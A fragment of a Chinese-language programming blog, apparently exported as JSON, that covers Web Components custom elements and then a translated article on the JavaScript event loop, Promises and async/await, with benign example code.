HTMLElement { constructor() { super(); var self = this; self.addEventListener('click', () =&gt; { self.innerHTML = '&lt;b&gt; I have been clicked &lt;/b&gt;'; }); }}customElements.define('my-custom-element', MyCustomElement); 123&lt;my-custom-element&gt; I have not been clicked yet&lt;/my-custom-element&gt; 第一眼看上去，自定义元素反而需要写更多代码。但在实际程序中，创建不需复用的单一组件的情况是很少见的。一个典型的现代网页程序的重要特征即大多数元素都是动态创建的。那么，开发者就需要分别处理使用 JavaScript 动态添加元素或者使用 HTML 结构中预定义内容。那么可以使用自定义元素来实现这些功能。 总之，自定义元素让开发者的代码更易理解和维护，并分割为小型，可复用及可封装的模块。 要求创建自定义元素之前，开发者需要遵守如下特殊规则： 名称必须包含一个破折号 - 。这样 HTML 解析器就可以把自定义元素和内置元素区分开来。这样可以保证不会和内置元素发生命名冲突(不管是现在或者将来当添加其它元素的时候)。比如，&lt;my-custom-element&gt; 是正确的而不是 myCustomElement 和 &lt;my_custom_element&gt; 。 不允许重复注册标签名称。重复注册标签名称会导致浏览器抛出 DOMException 错误。不可以覆盖已注册自定义元素。 自定义元素不可以自闭合。HTML 解析器只允许少部分内置元素可以自闭合(比如 &lt;img&gt;，&lt;link&gt;，&lt;br&gt;)。 功能那么究竟自定义元素可以实现哪些功能？答案是很多。 最好用的功能之一即元素的类定义可以引用 DOM 元素自身。这意味着开发者可以直接使用 this 来直接监听事件，访问 DOM 属性，访问 DOM 元素子节点等等。 12345678910111213class MyCustomElement extends HTMLElement { // ... constructor() { super(); this.addEventListener('mouseover', () =&gt; { console.log('I have been hovered'); }); } // ...} 这样开发者就可以使用新内容来覆盖元素的子节点。但一般不推荐这样做，因为这可能会导致意外的行为。作为自定义元素的使用者，因为不是使用者开发的，当元素里面的标记被其它内容替换，用户会觉得很奇怪。 在元素生命周期的特定阶段，开发者可以在一些生命周期钩子中执行代码。 constructor 每当创建或者更新元素会触发构造函数(随后再详细讲解下)。一般情况会在该阶段初始化状态，监听事件，创建 shadow DOM 等等。需要记住的是必须总是在构造函数中调用 super()。 connectedCallback 每当在 DOM 中添加元素的时候会调用 connectedCallback 方法。可以用来(推荐)延迟执行某些代码直到元素完全渲染于页面上时候调用(比如获取一个资源)。 disconnectedCallback 与 connectedCallback相反，当元素被从 DOM 删除时调用 disconnectedCallback 方法。一般用于释放资源的时候调用。需要注意的是若用户关闭选项卡不会调用 disconnectedCallback 方法。因此，首先开发者需要注意初始化代码。 attributeChangedCallback 每当添加，删除，更新或者替换元素的某一属性的时候调用。当解析器创建的时候也会调用。但是，请注意只有在 observedAttributes 属性白名单中的属性才会触发。 addoptedCallback 当使用 document.adoptNode(...) 来把元素移动到另一个文档的时候会触发 addoptedCallback方法。 请注意以上所有的回调都是同步。例如，当把元素添加进 DOM 的时候立即调用已连接的回调，与此同时没有任何其他事情会发生。 属性反射内置 HTML 元素提供了一个非常方便的功能:属性反射。这意味着直接修改某些属性值会直接反射到 DOM 的属性中。例如 id 属性： myDiv.id = 'new-id'; 将会更新 DOM 为 &lt;div id=&quot;new-id&quot;&gt; ... &lt;/div&gt; 反之亦然。这是非常有用的，这样就允许开发者声明式书写元素。 自定义元素自身没有该功能，但是有办法可以实现。为了在自定义元素中实现该相同的功能，开发者需要定义属性的 getters 和 setters 方法。 1234567891011121314151617class MyCustomElement extends HTMLElement { // ... get myProperty() { return this.hasAttribute('my-property'); } set myProperty(newValue) { if (newValue) { this.setAttribute('my-property', newValue); } else { this.removeAttribute('my-property'); } } // ...} 扩展元素开发者不仅可以使用自定义元素接口创建新的 HTML 元素还可以用来扩展现有的 HTML 元素。而且该接口在内置元素和其它自定义元素中工作得很好。仅仅只需要扩展元素的类定义即可。 12345class MyAwesomeButton extends MyButton { // ...}customElements.define('my-awesome-button', MyAwesomeButton); 或当扩展内置元素时，开发者需要为 customElements.define(...) 函数添加第三个 extends 的参数，参数值为需要扩展的元素标签名称。由于许多内置元素共享相同的 DOM 接口，extends 参数会告诉浏览器需要扩展的目标元素。若没有指定需要扩展的元素，浏览器将不会知道需要扩展的功能类别 。 12345class MyButton extends HTMLButtonElement { // ...}customElements.define('my-button', MyButton, {extends: 'button'}); 一个可扩展原生元素也被称为可定制化内置元素。 开发者需要记住的经验法则即总是扩展存在的 HTML 元素。然后渐进式地添加功能。这样就可以保留元素之前的功能(属性，函数)。 请注意目前只有 Chrome 67+ 才支持定制化内置元素。以后，其它浏览器也会实现，但是 Safari 完全没有实现该功能。 更新元素如上所述，可以使用 customElements.define(...) 方法注册自定义元素。但这并不意味着，开发者必须首先注册元素。可以推迟在之后某个时间注册自定义元素。甚至可以在往 DOM 中添加元素后再注册元素也是可以的。这一过程称为更新元素。开发者可以使用 customElements.whenDefined(...) 方法获取元素的定义时间。开发者传入元素标签名，返回一个 promise 对象，然后当元素注册的时候解析。 123customElements.whenDefined('my-custom-element').then(_ =&gt; { console.log('My custom element is defined');}); 例如，开发者也许想要延迟执行代码直到定义元素内所有子元素。这对于内嵌自定义元素会非常有用。 有时候，父元素有可能会依赖于其子元素的实现。在这种情况下，开发者需要确保子元素在其父元素之前定义。 Shadow DOM如前所述，需要把自定义元素和 shadow DOM 一起使用。前者用来把 JavaScript 逻辑封装进元素而后者用来为一小段 DOM 创建一个不为外部影响的隔绝环境。 只需调用 this.attachShadow 就可以在自定义元素内使用 shadow DOM 12345678910111213class MyCustomElement extends HTMLElement { // ... constructor() { super(); let shadowRoot = this.attachShadow({mode: 'open'}); let elementContent = document.createElement('div'); shadowRoot.appendChild(elementContent); } // ...}); 模板我们在之前的文章中简单介绍了下模板，需要单独一篇文章来专门介绍模板。这里我们会给出一个简单的示例来介绍如何在自定义元素中使用模板。 通过&lt;template&gt;来声明一个 DOM 片段来使用，该标签内容只会被解析而不会在页面上渲染。 123456&lt;template id=\"my-custom-element-template\"&gt; &lt;div class=\"my-custom-element\"&gt; &lt;input type=\"text\" class=\"email\" /&gt; &lt;button class=\"submit\"&gt;&lt;/button&gt; &lt;/div&gt;&lt;/template&gt; 1234567891011121314let myCustomElementTemplate = document.querySelector('#my-custom-element-template');class MyCustomElement extends HTMLElement { // ... constructor() { super(); let shadowRoot = this.attachShadow({mode: 'open'}); shadowRoot.appendChild(myCustomElementTemplate.content.cloneNode(true)); } // ...}); 那么我们在自定义元素里面使用了 shadow DOM 和 模板来创建一个元素，该元素作用域和其它元素隔绝且把 HTML 结构和 JavaScript 逻辑完美地隔离开来。 样式化我们讲解过了 HTML 和 JavaScript，现在还剩下 CSS。显然，需要样式化元素。开发者可以在 shadow DOM 中添加样式但是用户如何从外部样式化元素呢？答案很简单－只需要和一般的内置元素一样写样式即可。 123456my-custom-element { border-radius: 5px; width: 30%; height: 50%; // ...} 注意外部定义的样式比元素内部定义的样式优先级高，外部样式会覆盖掉元素内定义的样式。 开发者需要明白有时候页面渲染在某些时刻会发现无样式内容闪烁(FOUC)。开发者可以通过为未定义组件定义样式及当元素已定义的时候使用一些动画过渡效果。使用 :defined 选择器来达成这一效果。 12345my-button:not(:defined) { height: 20px; width: 50px; opacity: 0;} 未知元素对比未定义自定义元素HTML 规范非常灵活且允许开发者任意声明标签。若不被浏览器解析则会解析为 HTMLUnknownElement。 12345var element = document.createElement('thisElementIsUnknown');if (element instanceof HTMLUnknownElement) { console.log('The selected element is unknown');} 但是这并不适用于自定义元素。还记得讨论定义自定义元素时候的特殊命名规则吗？原因是因为当浏览器发现一个自定义元素的名称有效的时候，浏览器会把它解析为 HTMLElement ，然后浏览器会把它看作一个未定义的自定义元素。 123456var element = document.createElement('this-element-is-undefined');if (element instanceof HTMLElement) { console.log('The selected element is undefined but not unknown');}// The selected element is undefined but not unknown 视觉效果上， HTMLElement 和 HTMLUnknownElement 没啥不同，但是需要注意其它地方。解析器会区别对待这两种元素。具有有效自定义名称的元素会被看作拥有自定义元素实现。在定义实现细节之前该自定义元素会被看成一个空 div 元素。而一个未定义元素没有实现任何内置元素的任何方法或属性。 浏览器兼容custom elements 第一版是在 Chrome 36+ 中引入的。被称为自定义元素接口 v0，虽然现在仍然可用，但是该版本已被被认为是糟糕的实现并弃用。若想要学习 v0 版，可以阅读这篇文章。从 Chrome 54 和 Safari 10.1(虽然只有部分支持) 开始支持自定义元素接口 v1，微软 Edge 还处于其原型设计阶段而 Mozilla 从 v50 开始支持，但默认不支持需要显式启用。目前只有 webkit 浏览器完全支持。然而，如上所述，可以使用垫片库兼容到包括 IE11 在内的所有浏览器。 检测可用性通过检查 window 对象中的 customElements 属性是否可用来检查浏览器是否支持自定义元素。 12345const supportsCustomElements = 'customElements' in window;if (supportsCustomElements) { // 可以使用自定义元素接口} 否则需要使用 polyfill 库： 1234567891011121314151617181920function loadScript(src) { return new Promise(function(resolve, reject) { const script = document.createElement('script'); script.src = src; script.onload = resolve; script.onerror = reject; document.head.appendChild(script); });}// Lazy load the polyfill if necessary.if (supportsCustomElements) { // 浏览器原生支持自定义元素} else { loadScript('path/to/custom-elements.min.js').then(() =&gt; { // 加载自定义元素垫片 });} 总结，网页组件标准中的自定义元素为开发者提供了如下功能： 把 JavaScript 行为 和 CSS 样式整合入 HTML 元素 允许开发者扩展已有的 HTML 元素(内置元素和其它自定义元素) 不需要其它库或者框架的支持。只需要原生 JavaScript，HTML 和 CSS 还有可选的 Polyfill 库来支持旧浏览器。 可以和其它网页组件功能无缝衔接(shadow DOM，模板，插槽等)。 与浏览器开发者工具紧密集成=。 使用现有的辅助功能 总之，自定义元素和开发者已经使用过的组件技术并没有什么大的不同。它只让开发网页程序过程更加便捷的另一种方式。它让更快地构建非常复杂的程序成为可能。 参考资料： https://developers.google.com/web/fundamentals/web-components/customelements https://www.html5rocks.com/en/tutorials/webcomponents/customelements/ https://github.com/w3c/webcomponents/","link":"/posts/9af960d5.html"},{"title":"事件循环及异步编程","text":"How JavaScript works: Event loop and the rise of Async programming + 5 ways to better coding with async/await 原文请查阅这里 本章中, 我们将回顾单线程环境下编程的缺点及如何利用事件循环和async/await来规避他它们。老规矩，我们将在结尾分享 5 条利用 async/await 编写更简洁代码的技巧。 为什么单线程存在局限性在本系列第一章开头，我们思考了一个这样的问题:当调用栈中含有需要长时间运行的函数调用的时候会发生什么。 比如在浏览器中运行着一个复杂的图片转化算法。 当调用栈中有函数需要执行时，浏览器将会被阻塞，不能够做其它事情。这意味着，浏览器会没有响应，不能够进行渲染和运行其它代码。这将会带来问题－程序界面将不再高效和令人愉悦。于是程序卡住了。 某些情况下，这或许不算大问题。但这可能会造成更加严重的连锁反应。一旦调用栈中同时运行太多的任务时，浏览器会很长时间停止响应。到了那个时候，大多数浏览器会抛出一个错误，询问你是否选择关闭网页。 这既不优雅也失去用户体验。 一个JavaScript 程序的组成部分你可能会在一个 js 文件中编写 JavaScript 程序，但是你的程序是由多个代码块组成的，当前只有一个代码块在运行，其它将在随后运行。最常见的代码块单元是函数。 一个多数 JavaScript 菜鸟有可能需要理解的问题即之后运行表示的是并不是必须严格且立即在现在之后执行。换句话说即，根据定义，现在不能够运行完毕的任务将异步地完成，这样你就不会在不经意间遇到上述 UI 阻塞行为。 看下如下代码： 12345// ajax 为一个库提供的任意 ajax 函数var response = ajax('https://example.com/api');console.log(response);// `response` 将不会有数据返回 可能你已经知道标准 ajax 请求不会完全同步执行完毕，意思是在代码运行阶段，ajax(..) 函数不会有返回值赋予 response 变量。 获得异步函数返回值的一个简单方法是使用回调函数。 123ajax('https://example.com/api', function(response) { console.log(response); // `response` 现在有值}); 要注意一点：即使可以也永远不要发起同步 ajax 请求。如果发起同步 ajax 请求，JavaScript 程序的 UI 将会被阻塞－用户将无法进行点击，输入数据，跳转或者滚动等操作。这是非常糟糕的用户交互体验。 错误示例代码如下： 12345678// 假设你使用 jQueryjQuery.ajax({ url: 'https://api.example.com/endpoint', success: function(response) { // 成功回调. }, async: false // 同步}); 我们以 Ajax 请求为例。你可以异步执行任意代码。 你可以使用 setTimeout(callback, milliseconds) 函数来异步执行代码。setTimeout 函数会在之后的某个时刻触发事件(定时器)。如下代码： 123456789101112function first() { console.log('first');}function second() { console.log('second');}function third() { console.log('third');}first();setTimeout(second, 1000); // 1 秒后调用 second 函数third(); 控制台输出如下： 123firstthirdsecond 什么是事件循环我们将从一个奇怪问题开始－尽管异步执行 JavaScript 代码的操作是被允许的(比如上面讨论的 setTimetout)，实际上直到 ES6 推出之前， JavaScript 本身并没有集成任何直接的异步编程概念。JavaScript 引擎在任意时刻只允许执行单个的程序片段。 可以查看第二章来了解 JavaScript 引擎(尤其是Google的 V8引擎)的工作原理。 那 JS 引擎是如何执行程序片段的呢？实际上，JS 引擎并不是隔离运行的－它运行在一个宿主环境中，对绝大多数开发者来说是不是典型的 web 浏览器就是 Node.js。如今 JavaScript 广泛应用于从机器到电灯泡的各种设备之中。每个设备代表了 JS 引擎的不同类型的宿主环境。 所有宿主环境存在一个共同点: 存在名为事件循环的内置机制，每次调用JS引擎时，它都会处理程序中多个代码块的执行。 这意味着 JS 引擎只是任意 JS 代码的按需执行环境。这是一个进行事件的调度(运行 JS 代码)的封闭环境。 举个例子，当 JavaScript 程序发起 Ajax 请求来从服务器获取数据，你在回调函数中书写 “response” 代码，JS 引擎会告诉宿主环境： “嘿，我现在要暂停执行了，完成网络请求并返回数据时，请执行回调。” 接着浏览器会监听网络响应，当有数据返回时，它会通过把回调函数插入事件循环以便调度执行。 如下图示： 那么什么是网页 APIs ？本质上，它们是你无权访问的线程，只能调用。它们是浏览器自带的，用于进行并发操作。如果你是个 Node.js 开发者，这些是 C++ APIs。 事件循环是什么？ 事件循环只做一件事－监测调用栈和回调队列。如果调用栈是空的，它会从回调队列中取得第一个事件然后入栈，并有效地执行。 事件循环中的这样一次遍历被称为一个 tick。每个事件就是一个回调函数。 12345console.log('Hi');setTimeout(function cb1() { console.log('cb1');}, 5000);console.log('Bye'); 让我们执行这段代码，然后看看会发生什么： 空状态。浏览器控制台是空的，调用栈也是空的。 console.log('Hi') 入栈。 执行 console.log('Hi')。 console.log('Hi') 出栈 setTimeout(function cb1() { ... }) 入栈。 执行 setTimeout(function cb1() { ... })，浏览器创建定时器作为网页 API 的一部分并将会为你处理倒计时。 setTimeout(function cb1() { ... }) 执行完毕并出栈。 console.log('Bye') 入栈。 执行 console.log('Bye')。 console.log('Bye') 出栈。 至少 5 秒之后，定时器结束运行并把 cb1 回调添加到回调队列。 事件循环从回调队列中获得 cb1 函数并且将其入栈。 运行 cb1 函数并将 console.log('cb1') 入栈。 执行 console.log('cb1')。 console.log('cb1') 出栈。 cb1 出栈 有趣的是，ES6 规定事件循环应该如何工作，这意味着从技术上讲，它属于 JS 引擎负责的范围之内，而 JS 引擎将不再只是宿主环境的角色。ES6 中 Promise 的出现是变化产生的主要原因之一，因为 ES6 要求有权限直接细粒度地控制事件循环队列中的调度操作(后面会深入探讨)。 setTimeout(…) 工作原理需要注意的是 setTimeout(…) 并没有自动把回调添加到事件循环队列。它创建了一个定时器。当定时器过期，宿主环境会把回调函数添加至事件循环队列中，然后，在未来的某个 tick 取出并执行该事件。请看如下代码： 1setTimeout(myCallback, 1000); 这并不意味着 1 秒之后会执行 myCallback 回调而是在 1 秒后将其添加到回调队列。然而，队列在之前可能添加了其它事件－所以回调就会被阻塞。 有相当一部分的文章和教程开始会建议你使用 setTimeout(callback, 0) 来书写 JavaScript 异步代码。那么，现在你明白了事件循环和 setTimeout 的原理：调用 setTimeout 把其第二个参数设置为 0 表示延迟执行回调直到调用栈被清空。 查看如下代码： 12345console.log('Hi');setTimeout(function() { console.log('callback');}, 0);console.log('Bye'); 虽然定时时间设定为 0， 但是控制台中的结果将会如下显示： 123HiByecallback ES6 作业概念ES6 介绍了一个『作业队列』的概念。它位于事件循环队列的上层。你极有可能在处理 Promises(之后会介绍) 的异步行为的时候无意间接触到这一概念。 现在我们将介绍这个概念，以便当讨论 Promises 的异步行为时帮助理解如何调度和处理这些行为。 想象一下：作业队列是附加于事件循环队列中每个 tick 末尾的队列。事件循环的一个 tick 所产生的某些异步操作不会导致添加全新的事件到事件循环队列中，反而会在当前 tick 的作业队列末尾添加一项作业。 这意味着，你可以延时运行添加其它功能并且你可以确保它会在其它任何功能之前立刻执行。 一个作业也可以在同一队列末尾添加更多的作业。理论上讲，存在着作业循环的可能性(比如作业不停地添加其它作业)。 为了无限循环，因此使程序缺少进入下一个事件循环 tick 的必要资源。从概念上讲，这类似于在代码里面书写耗时或者死循环(类似 while(true))。 作业有些类似于 setTimeout(callback, 0) 小技巧，但是是以这样的方式实现的，它们拥有明确定义和有保证的执行顺序：之后且尽快地执行。 回调正如你所知，回调函数是 JavaScript 程序中用来表示和进行异步操作的最常见方法。的确，回调是 JavaScript 语言中最为重要的异步模式。无数的 JS 程序，甚至非常复杂的那些，都是建立在回调函数之上的。 回调不是毫无缺点。许多开发者试图找到更好的异步模式。然而，如果你不理解底层原理而想要高效地使用任何抽象语法是不可能的。 在接下来的章节中，我们将会深入探究这些抽象语法并理解更复杂的异步模式的必要性。 嵌套回调查看以下示例： 123456789101112listen('click', function (e){ setTimeout(function(){ ajax('https://api.example.com/endpoint', function (text){ if (text == \"hello\") { doSomething(); } else if (text == \"world\") { doSomethingElse(); } }); }, 500);}); 我们有三个链式嵌套函数，每个函数代表一个异步操作。 这类代码通常被称为『回调地狱』。但是，实际上『回调地狱』和代码嵌套及缩进没有任何关系。这是一个更加深刻的问题。 首先，我们监听点击事件，然后，等待定时器执行，最后等待 Ajax 返回数据，在 Ajax 返回数据的时候，可以重复执行这一过程。 一眼看上去，可以把以上具有异步特性的代码拆为几个步骤，如下： 123listen('click', function (e) { // ..}); 之后： 123setTimeout(function(){ // ..}, 500); 第三： 123ajax('https://api.example.com/endpoint', function (text){ // ..}); 最后： 12345if (text == \"hello\") { doSomething();} else if (text == \"world\") { doSomethingElse();} 这样顺序执行的方式来表示异步代码看起来更自然明了，应该有这样的方法吧？ Promises我们来看一个例子： 123var x = 1;var y = 2;console.log(x + y); 这个非常直观：计算出 x 和 y 的值然后在控制台打印出来。但是，如果 x 或者 y 的初始值是不存在的且不确定的呢？假设，在表达式中使用 x 和 y 之前，我们需要从服务器得到 x 和 y 的值。想象下，我们拥有函数 loadX 和 loadY 分别从服务器获取 x 和 y 的值。然后，一旦获得 x 和 y 的值，就可以使用 sum 函数计算出和值。 类似如下(“丑陋”的代码)： 1234567891011121314151617181920212223242526272829function sum(getX, getY, callback) { var x, y; getX(function(result) { x = result; if (y !== undefined) { callback(x + y); } }); getY(function(result) { y = result; if (x !== undefined) { callback(x + y); } });}// 同步或异步获取 `x` 值的函数function fetchX() { // ..}// 同步或异步获取 `y` 值的函数function fetchY() { // ..}sum(fetchX, fetchY, function(result) { console.log(result);}); 有一点非常重要, 在代码片段中，x 和 y 是未来值，我们用 sum(..)(从外部)来计算和值，但是并没有关注 x 和 y 是否马上同时有值。 当然这个基于回调的粗糙方法还有很多需要改进的地方。这只是理解推出未来值而不用担心何时有返回值的好处的一小步。 Promise 值让我们简略地看一下如何用 Promises 来表示 x+y ： 12345678910111213141516171819function sum(xPromise, yPromise) { // `Promise.all([ .. ])` 包含一组 Promise, // 并返回一个新的 Promise 来等待所有 Promise 执行完毕 return Promise.all([xPromise, yPromise]) // 当新 Promise 解析完毕，就可以同时获得 `x` 和 `y` 的值并相加。 .then(function(values){ // `values` 是之前解析 promises 返回的消息数组 return values[0] + values[1]; } );}// `fetchX()` and `fetchY()` 返回 promise 来取得各自的返回值，这些值返回是无时序的。sum(fetchX(), fetchY())// 获得一个计算两个数和值的 promise，现在，就可以链式调用 `then(...)` 来处理返回的 promise。.then(function(sum){ console.log(sum);}); 以上代码片段包含两层 Promise。 fetchX() 和 fetchY() 都是直接调用，它们的返回值(promises!)都被传入 sum(…) 作为参数。虽然这些 promises 的 返回值也许会在现在或之后返回，但是无论如何每个 promise 都具有相同的异步行为。我们可以的推算 x 和 y 是与时间无关的值。暂时称他们为未来值。 第二层 promise 是由 sum(…) (通过 Promise.all([ … ]))所创建和返回的，然后通过调用 then(…) 来等待 promise 的返回值。当 sum(…) 运行结束，返回 sum 未来值然后就可以打印出来。我们在 sum(…) 内部隐藏了等待未来值 x 和 y 的逻辑。 注意：在 sum(…) 内部，Promise.all([ … ])创建了一个 promise(在等待 promiseX 和 promiseY 解析之后)。链式调用 .then(…) 创建了另一个 promise，该 promise 会由代码 values[0] + values[1] 立刻进行解析(返回相加结果)。因此，在代码片段的末尾即 sum(…) 的末尾链式调用 then(…)－实际上是在操作第二个返回的 promise 而不是第一个由 Promise.all([ ... ]) 创建返回的 promise。同样地，虽然我们没有在第二个then(…) 之后进行链式调用，但是它也创建了另一个 promise，我们可以选择观察／使用该 promise。我们将会在本章的随后内容中进行详细地探讨 promise 的链式调用相关。 在 Promises 中，实际上 then(…) 函数可以传入两个函数作为参数，第一个函数是成功函数，第二个是失败函数。 1234567891011sum(fetchX(), fetchY()).then( // fullfillment handler function(sum) { console.log( sum ); }, // rejection handler function(err) { console.error( err ); // bummer! }); 当获取 x 或者 y 出错或者计算和值时出错，sum(…) 返回的 promise 将会失败，传入 then(…) 作为第二个参数的回调错误处理程序将会接收 promise 的返回值。 因为 Promises 封装了时间相关的状态－等待外部的成功或者失败的返回值，Promises 本身是与时间无关的，这样就可以用可预测的方式组成(合并) Promises 而不用关心时序或者返回结果。 除此之外，一旦 Promise 解析完成，它就会一直保持不可变的状态且可以在需要时被随意观察。 链式调用 promises 很不错： 12345678910111213141516171819function delay(time) { return new Promise(function(resolve, reject){ setTimeout(resolve, time); });}delay(1000) .then(function(){ console.log(\"after 1000ms\"); return delay(2000); }) .then(function(){ console.log(\"after another 2000ms\"); }) .then(function(){ console.log(\"step 4 (next Job)\"); return delay(5000); })// ... 调用 delay(2000) 创建一个将在 2 秒后返回成功的 promise，然后，从第一个 then(…) 的成功回调函数中返回该 promise，这会导致第二个 then(…) 返回的 promise 等待 2 秒后返回成功的 promise。 注意：因为一个 promise 一旦解析其状态就不允许外部改变，因此可以安全地把状态值随意分发给任意第三方。当涉及多方观察 Promise 的返回结果时候更是如此。一方影响另一方观察 Promise 返回结果的能力是不存在的。不可变性听起来像是个晦涩的学术课题，但实际上这是 Promise 设计思想上最根本和重要的方面，你得好好研究研究。 使用Promise, 不使用Promise, 这是一个问题Promise 的一个重要细节即确定某些值是否是真正的 Promise。换句话说，这个值是否具有 Promise 的行为。 我们知道 new Promise(…) 语法可以用来创建 Promises，所以你可能会认为使用 p instanceof Promise 来检测某个对象是否是 Promise 类的实例是可行的。然而，并不全然如此。 主要原因在于你可以从另一个浏览器窗口(比如 iframe)获得 Promise 实例，iframe 中的 Promise 不同于当前浏览器窗口或框架中的 Promise，因此，会导致检测 Promise 实例失败。 除此之外，某些库或框架或许会选择使用自身自带的 Promise 而不是原生的 ES6 实现的 Promise。实际工作中，你可以使用库自带的 Promise 来兼容不支持 Promise 的老版本浏览器。 异常捕获如果在创建 Promise 或者是在观察解析 Promise 返回结果的任意时刻，遇到了 TypeError 或者 ReferenceError 的 JavaScript 错误异常，这个异常会被捕获进而强制 Promise 为失败状态。 比如： 1234567891011121314var p = new Promise(function(resolve, reject){ foo.bar(); // `foo` 未定义，产生错误! resolve(374); // 永不执行 :(});p.then( function fulfilled(){ // 永不执行 :( }, function rejected(err){ // `err` 会是一个 `TypeError` 异常对象 // 由于 `foo.bar()` 代码行. }); 但是，如果 Promise 成功解析了而在成功解析的监听函数(then(…) 注册回调)中抛出 JS 运行错误会发生什么？仍然可以捕捉到该异常，但或许你会发现处理这些异常的方式有些让人奇怪。直到深入理解其原理： 123456789101112var p = new Promise( function(resolve,reject){ resolve(374);});p.then(function fulfilled(message){ foo.bar(); console.log(message); // 永不执行}, function rejected(err){ // 永不执行 }); 看起来 foo.bar(没) 抛出的错误异常真的被捕获到了。然而事实上并有。深入理解你会发现我们没有监测到其中某些错误。p.then(…) 调用本身返回另一个 promise，该 promise 会返回 TypeError 类型的异常失败信息。 处理未捕获的异常有其它更好的处理异常的技巧。 普遍的做法是为 Promises 添加 done(..) 回调，本质上这会标记 promise 链的状态为 “done.”。done(…) 并不会创建和返回 promise，因此，当不存在链式 promise 的时候，传入 done(..) 的回调显然并不会抛出错误。 和未捕获的错误状况一样：任何在 done(..) 失败处理函数中的异常都将会被抛出为全局错误(基本在开发者控制台)。 123456789var p = Promise.resolve(374);p.then(function fulfilled(msg){ // 数字没有字符类的函数，所以会报错 console.log(msg.toLowerCase());}).done(null, function() { // 若发生错误，将会抛出全局错误}); ES8 的 Async/awaitJavaScript ES8 引入了 async/await，这使得处理 Promises 更加容易。我们将会简要介绍 async/await 的所有可能使用方式来编写异步代码。 使用 async 函数定义一个异步函数。该函数会返回异步函数对象。AsyncFunction 对象表示在异步函数中运行其内部代码。 当AsyncFunction被调用时，它会返回一个 Promise。异步函数返回值并非 Promise，在函数过程中会自动创建一个 Promise 并使用函数的返回值来解析该 Promise。当 async 函数抛出异常，Promise 失败回调会获取抛出的异常值。 async 函数可以包含一个 await 表达式，这样表示暂停函数的执行来等待传入的 Promise 的返回结果，之后重启异步函数的执行并返回解析值。 你可以把 JavaScript 中的 Promise 看作 Java 中的 Future 或 C# 中的 Task。 async/await 本意是用来简化 promises 。 看下如下代码： 12345678// 一个标准 JavaScript 函数function getNumber1() { return Promise.resolve('374');}// 和 getNumber1 一样async function getNumber2() { return 374;} 类似地，抛出异常的函数等同于返回失败的 promises。 123456function f1() { return Promise.reject('Some error');}async function f2() { throw 'Some error';} await 关键字只能在 async 函数中使用并且允许你同步等待 Promise。如果在 async 函数外使用 promises，我们仍然必须使用 then 回调。 123456789101112async function loadData() { // `rp` 是个发起 promise 的函数。 var promise1 = rp('https://api.example.com/endpoint1'); var promise2 = rp('https://api.example.com/endpoint2'); // 现在，并发请求两个 promise，现在我们必须等待它们结束运行。 var response1 = await promise1; var response2 = await promise2; return response1 + ' ' + response2;}// 因为不再使用 `async function`，所以必须使用 `then`。loadData().then(() =&gt; console.log('Done')); 你也可以使用异步函数表达式来定义异步函数。异步函数表达式拥有和异步函数语句相近的语法。异步函数表达式和异步函数语句的主要区别在于函数名，异步函数表达式可以忽略函数名来创建匿名函数。异步函数表达式可以被用作 IIFE(立即执行函数表达式)，可以在定义的时候立即运行。 比如： 12345678910var loadData = async function() { // `rp` 是个发起 promise 的函数。 var promise1 = rp('https://api.example.com/endpoint1'); var promise2 = rp('https://api.example.com/endpoint2'); // 现在，并发请求两个 promise，现在我们必须等待它们结束运行。 var response1 = await promise1; var response2 = await promise2; return response1 + ' ' + response2;} 更为重要的是，所有主流浏览器都支持 async/await 语法。 如果该兼容性不符合你的需求，你可以使用 Babel 和 TypeScript 等JS 转译器。 不要盲目地使用最新技术来编异步代码。理解 JavaScript 中 async 的内部原理是非常重要的，学习为什么深入理解所选择的方法是很重要的。正如编程中的其它东西一样，每种技术都是一把双刃剑。 书写高可用，强壮的异步代码的 5 个技巧 简洁：使用 async/await 可以让你写更少的代码。每次书写 async/await 代码，你都可以跳过书写一些不必要的步骤： 比如不用写 .then 回调，创建匿名函数来处理返回值，命名回调返回值。比如: 1234// `rp` 是个发起 promise 的工具函数。rp('https://api.example.com/endpoint1').then(function(data) { // …}); 对比： 12// `rp` 是个发起 promise 的工具函数var response = await rp('https://api.example.com/endpoint1'); 2.错误处理：Async/await 允许使用常用的 try/catch 代码结构体来处理同步和异步错误。看看与 Promise 的比较： 123456789101112function loadData() { try { // 捕获同步错误. getJSON().then(function(response) { var parsed = JSON.parse(response); console.log(parsed); }).catch(function(e) { // 捕获异步错误. console.log(e); }); } catch(e) { console.log(e); }} 对比： 12345678async function loadData() { try { var data = JSON.parse(await getJSON() console.log(data) } catch(e) { console.log(e); }} 3.条件语句：使用 async/await 来书写条件语句会更加直观。 123456789101112131415function loadData() { return getJSON() .then(function(response) { if (response.needsAnotherRequest) { return makeAnotherRequest(response) .then(function(anotherResponse) { console.log(anotherResponse) return anotherResponse }) } else { console.log(response) return response } })} 对比： 1234567891011async function loadData() { var response = await getJSON(); if (response.needsAnotherRequest) { var anotherResponse = await makeAnotherRequest(response); console.log(anotherResponse) return anotherResponse } else { console.log(response); return response; }} 4.栈桢：和 async/await 不同的是，从链式 promise 返回的错误堆栈中无法得知发生错误的地方。看如下代码： 123456789101112131415function loadData() { return callAPromise() .then(callback1) .then(callback2) .then(callback3) .then(() =&gt; { throw new Error(\"boom\"); })}loadData() .catch(function(e) { console.log(err);// Error: boom at callAPromise.then.then.then.then (index.js:8:13)}); 对比： 1234567891011121314async function loadData() { await callAPromise1() await callAPromise2() await callAPromise3() await callAPromise4() await callAPromise5() throw new Error(\"boom\");}loadData() .catch(function(e) { console.log(err); // output // Error: boom at loadData (index.js:7:9)}); 5.调试：如果用过 promises，你会明白调试它们是一场噩梦。例如，如果你在 .then 代码块中设置一个断点并且使用诸如 “stop-over” 的调试快捷键，调试器不会移动到下一个 .then 代码块，因为调试器只会步进同步代码。 使用 async/await 你可以将异步代码像同步代码一样步进到下一个 await 调用。 为什么编写异步 JavaScript 代码对库很重要用我们的产品 SessionStack 举个例子, 这个库记录你的web app/网站的所有行为: DOM改变，用户交互，Javascript 异常，栈跟踪，失败的网络请求和调试细信息。 这一切都在生产环境中进行，而不会影响任何用户体验。我们需要大量优化代码，并使其尽可能地异步，以此增加事件循环正在处理的事件数量。 不仅是库, 当你在 SessionStack 回放用户会话时, 必须在问题发生时渲染用户浏览器中发生的所有事情。为此我们必须重构整个状态，以允许您在会话时间轴中来回跳转。为了实现这一点，我们大量使用了JavaScript提供的异步方法。 参考资源 https://github.com/getify/You-Dont-Know-JS/blob/master/async%20%26%20performance/ch2.md https://github.com/getify/You-Dont-Know-JS/blob/master/async%20%26%20performance/ch3.md 